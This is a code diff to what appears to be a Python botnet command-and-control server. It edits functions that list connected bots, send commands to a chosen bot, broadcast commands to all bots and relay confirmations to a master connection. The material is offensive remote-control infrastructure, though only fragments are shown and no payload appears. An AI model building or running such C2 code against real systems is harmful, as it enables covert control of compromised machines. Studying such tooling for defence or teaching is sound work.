@@ -38,8 +38,7 @@ class Server:
 
 """
 def individual_bot_sock(bot,sock):
-    while True:
-        
+    while True:       
         data = sock.recv(1024).decode()
         print (data)
 
@@ -157,31 +156,71 @@ def sendCommand(bots, command):
 
     return bots
 
+"""
+Description: Parses the command from the user, returns command type and command itself
+Param:
+    - (str) command 
+Return:
+    - (int) cmdType = 1: single, 2: targeted, 3: Something is wrong  
 
+def parseCommand(command):
+    tokens = command.split(" ",1)
+
+    if len(tokens) == 1:
+        if str(tokens[0]) == "ls":
+            return 1, "ls"
+"""
+
+
+"""
+Description: Execute Command based on different command tokens 
+Param: 
+    - (bot list) bots = List of bots 
+    - (list) tokens = List of commands, splitted by spaces 
+    - (socket) mastersock = Master socket 
+
+"""
 def execCommand(bots, tokens, mastersock):
     if len(tokens) == 1:
         if str(tokens[0]) == "ls":
             result = '' 
+
+            if len(bots) == 0:
+                mastersock.send("[-] No bots available".encode())
             for bot in bots:
                 result += bot.prettyPrint()
             mastersock.send(result.encode())
-        elif str(tokens[0]) == "exit":
-            exit(1)
 
-    elif len(tokens) == 2:
+        elif str(tokens[0]) == "exit":
+            pass
+
+        else:
+            mastersock.send("Wrong command".encode())
+
+    elif len(tokens) == 2: 
         if tokens[0].isdigit():
-            print("[+] Sending command to bot[" + str(tokens[0]) + "]with command ", tokens[1])
+            print("[+] Bot[" + str(tokens[0]) + "]. Command: ", tokens[1])
+
+            # Send command, receive result, and send the result back to the master socket.
             for bot in bots:
                 if bot.idx == int(tokens[0]):
                     bot.sock.send(tokens[1].encode())
-            #bots[int(tokens[0])-1].sock.send(tokens[1].encode())
+                    #result = bot.sock.recv(4096).decode()
+
+                    # Sends back the debug message because master expects that 
+                    result = "\n[+] Bot[" + str(tokens[0]) + "]. Command: " + str(tokens[1])
+                    result +=  "\nCommand successfully delivered to all bots.\n"
+                    mastersock.send(result.encode())
 
         elif str(tokens[0]) == "broadcast":
             print("[+] Sending broadcast command to all bots")
             for bot in bots:
                 bot.sock.send(tokens[1].encode())
+                mastersock.send("\ncommand successfully delivered to all bots\n".encode())
+
 
     else:
+        print("[DEBUG] token length = ", len(tokens))
         mastersock.send("Wrong command".encode())
 
 
@@ -198,9 +237,6 @@ def masterSocket(sock, bots):
             tokens = command.split(" ",1)
 
             execCommand(bots, tokens, sock)
-            #bots = sendCommand(bots, command)
-            
-            sock.send("\nCommand successfully delivered to all bots.\n".encode())
 
         except Exception as err:
             print("[-] Master connection exited.", err)
@@ -264,10 +300,7 @@ while True:
         bots, threads = addBot(bots, conn, threads)
         socketz.append(conn)
         idx += 1
-        print(bots)
-        print("[DEBUG] idx = " + str(idx))
-        #idx = len(bots)
-
+        
         for bot in bots:
             bot.prettyPrint()
 
